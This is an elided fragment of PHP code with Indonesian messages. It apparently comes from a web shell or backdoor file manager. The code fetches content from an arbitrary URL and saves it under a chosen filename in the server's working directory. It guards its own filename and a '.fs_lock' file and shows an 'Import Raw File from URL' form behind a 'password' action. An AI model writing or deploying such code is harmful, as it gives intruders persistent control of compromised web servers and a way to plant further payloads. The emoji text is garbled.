    ...
    if (isset($_POST['download_url_and_save'])) {
        ...
        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($filename)) {
            ...
            if ($filename_safe === basename(__FILE__) || $filename_safe === '.fs_lock') {
                $message = "<span style='color:red;'>â Nama file ini tidak diizinkan!</span>";
            } elseif (!is_writable($cwd)) {
                $message = "<span style='color:red;'>â Direktori tidak dapat ditulis!</span>";
            } else {
                $data = getUrlContent($url);
                if ($data !== false && strlen($data) > 0) {
                    if (file_put_contents($destination_filepath, $data) !== false) {
                        $message = "<span style='color:green;'>â Berhasil menyimpan file sebagai <strong>" . htmlspecialchars($filename_safe) . "</strong></span>";
                    } else {
                        $message = "<span style='color:red;'>â Gagal menulis data ke file! Periksa izin.</span>";
                    }
                } else {
                    $message = "<span style='color:red;'>â Gagal mengambil data dari URL! Periksa log server untuk detail cURL.</span>";
                }
            }
        } else {
            $message = "<span style='color:red;'>â ï¸ URL tidak valid atau nama file kosong!</span>";
        }
...
if (isset($_GET['action'])) {
    ...
    if ($_GET['action'] === 'password') {
        ...
        echo "<h6 class='mt-4'>ð¥ Import Raw File from URL:</h6>
        <form method='post' class='mb-3'>
            <label for='url_to_download_raw' class='form-label'>ð URL Raw File:</label>
            ...
            <label for='filename_to_save' class='form-label'>ð¾ Save As (filename):</label>
